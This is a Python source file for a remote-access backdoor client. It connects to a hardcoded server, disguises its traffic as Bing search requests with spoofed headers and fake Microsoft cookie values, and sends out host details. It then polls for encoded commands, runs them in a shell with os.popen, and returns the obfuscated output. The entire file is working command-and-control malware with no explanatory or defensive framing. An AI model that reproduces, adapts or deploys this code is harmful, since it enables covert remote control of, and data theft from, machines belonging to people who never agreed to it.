from socket import * 
from random import *
import re
import os
import sys
import time
import base64

def Set_Data(Request='GET',UrlPath='',Data='',headers=''):
    Init_Conn_Pass=["MicrosoftAppCrsID=C5E2329D565B4B0A9018CADE484A4704",
        "MicrosoftAppCrsID=FEA8B7C2417163EB8A9A004C87B93DBA",
        "MicrosoftAppCrsID=7868C2B99F22E1C1BCD43DAB1014FA8A",
        "MicrosoftAppCrsID=4C33529F074AD0D5E65E41DDABEF2F28",
        "MicrosoftAppCrsID=EEAAC865731D40131CE88804FF23AE2D",
        "MicrosoftAppCrsID=1EEAE0EE47CA92FCE923BF30834BAD02",
        "MicrosoftAppCrsID=F13C1971DDECAACBA44DA0667E385FFF"]
    My_Pass=randint(0,len(Init_Conn_Pass)-1)

    My_data=Request+''' /'''+UrlPath+''' HTTP/1.1\r
Host: bing.com\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Cookie: '''+Init_Conn_Pass[My_Pass]+'''\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
'''+headers+'''\r
\r    
'''+Data
    return My_data

def Data_Encrypt(Data):
    Encrypt_data=''
    Data_len=len(Data)
    for i in range(Data_len):
        Encrypt_data=Encrypt_data+chr(ord(Data[i])+1)
    Encrypt_data=Encrypt_data[::-1]
    return Encrypt_data

def Data_Decrypt(Data):
    Decrypt_Data=''
    Data_len=len(Data)
    for i in range(Data_len):
        Decrypt_Data=Decrypt_Data+chr(ord(Data[i])-1)
    Decrypt_Data=Decrypt_Data[::-1]
    return Decrypt_Data

def Cookie_Handle(Data):
        Cookie=re.findall(r"Cookie:.*?\n",Data,re.S)
        if(Cookie):
            Cookie_List=Cookie[0][7:].split(";")
            for Cookie_Data in Cookie_List:
                Cookie_Data=Cookie_Data.strip()
                if("CRSameSite=" in Cookie_Data):
                    return Cookie_Data[11:]
            else:
                return False

def Get_Systeminfo():
    SystemName=sys.platform
    HostName=gethostname()
    Pid=os.getpid()
    Systeminfo=(SystemName+","+HostName+","+str(Pid))
    return Systeminfo

def Cmd_run(Data):
    Return_Cmd=''
    Exec_Cmd=os.popen(Data)
    Exec_Cmd=Exec_Cmd.read()
    for Cmd in Exec_Cmd:
        Return_Cmd=Return_Cmd+Cmd
    return Return_Cmd

if __name__=="__main__":
    Host="192.168.8.128"
    Port=80
    Bufsize=1024
    Socket_ADDR=(Host,Port)
    Cline_conn=socket(AF_INET, SOCK_STREAM)
    Cline_conn.connect((Socket_ADDR))
    ip=Cline_conn.getsockname()[0]
    #print(ip)
    Init_Data=Set_Data()
    #print(Init_Data)
    Cline_conn.sendall(bytes(Init_Data.encode()))
    Return_data=Cline_conn.recv(Bufsize)
    #print(Return_data)
    Return_Handle=Cookie_Handle(Return_data.decode())
    if(Return_Handle):
        if(Return_Handle=='Go_Online'):
            Systeminfo=Get_Systeminfo()
            Systeminfo=str(ip)+","+Systeminfo
            Systeminfo=Data_Encrypt(Systeminfo)
            Systeminfo='<T>'+Systeminfo+'</T>'
            Send_data=Set_Data(Request="POST",UrlPath="fd/ls/lsp.aspx",Data=Systeminfo,headers='Content-Type: text/xml')
            Cline_conn.sendall(bytes(Send_data.encode()))

    Pid_Encrypt=str(os.getpid())
    while(1):
        time.sleep(2)
        #Cline_conn=socket(AF_INET, SOCK_STREAM)
        #Cline_conn.connect((Socket_ADDR))
        
        #print("Process")
        UrlPath="search?q="+Pid_Encrypt+"A"
        Send_data=Set_Data(Request="GET",UrlPath=UrlPath)
        Cline_conn.sendall(bytes(Send_data.encode()))
        Return_data=Cline_conn.recv(Bufsize)
        while True:
            if("</html>"==Return_data.decode()[-7:]):
                break
            Return_data=Return_data+Cline_conn.recv(Bufsize)

        #print(Return_data)
        Return_Handle=Cookie_Handle(Return_data.decode())
        #Cline_conn.close()
        if(Return_Handle):
            if(Return_Handle=='Go_Speeck'):

                Specck=re.findall(r"<javascript>(.*)</javascript>",Return_data.decode())
                #print(len(Specck[0]))
                if(len(Specck[0])>1):

                    Specck=Data_Decrypt(Specck[0])
                    Specck_Data=Cmd_run(Specck)
                    if(len(Specck_Data)<1):
                        Specck_Data="Command execution failed"
                    Send_data=Set_Data(Request="GET",UrlPath="Session.js")
                    #Cline_conn=socket(AF_INET, SOCK_STREAM)
                    #Cline_conn.connect((Socket_ADDR))
                    Cline_conn.sendall(bytes(Send_data.encode()))
                    #Cline_conn.close()
                    #print(Specck_Data)

                    Specck_Data=base64.b64encode(Specck_Data.encode())
                    Specck_Data=Data_Encrypt(Specck_Data.decode())
                    Specck_Data="<T>"+Specck_Data+"</T>"
                    UrlPath="fd/ls/GLinkPingPost.aspx?q="+Pid_Encrypt+"A"
                    Send_data=Set_Data(Request="POST",UrlPath=UrlPath,Data=Specck_Data,headers='Content-Type: text/xml')
                    time.sleep(8)
                    for i in range(100000):
                        c=i+1

                    Cline_conn.sendall(bytes(Send_data.encode()))

                
                    
        